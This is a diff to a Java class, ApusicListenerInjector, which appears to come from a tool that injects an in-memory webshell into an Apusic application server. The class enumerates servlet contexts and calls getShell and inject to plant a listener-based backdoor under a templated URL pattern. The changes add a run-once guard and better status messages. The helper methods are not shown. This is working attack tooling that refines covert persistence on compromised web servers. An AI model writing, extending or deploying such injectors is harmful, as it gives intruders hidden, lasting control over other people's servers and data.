@@ -16,6 +16,7 @@ import java.util.zip.GZIPInputStream;
 public class ApusicListenerInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -30,24 +31,30 @@ public class ApusicListenerInjector {
     }
 
     public ApusicListenerInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
-                msg += ("context: [" + getContextRoot(context) + "] ");
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                    msg += "[/*] ready\n";
+                    msg += "[" + getUrlPattern() + "] ready\n";
                 } catch (Throwable e) {
                     msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
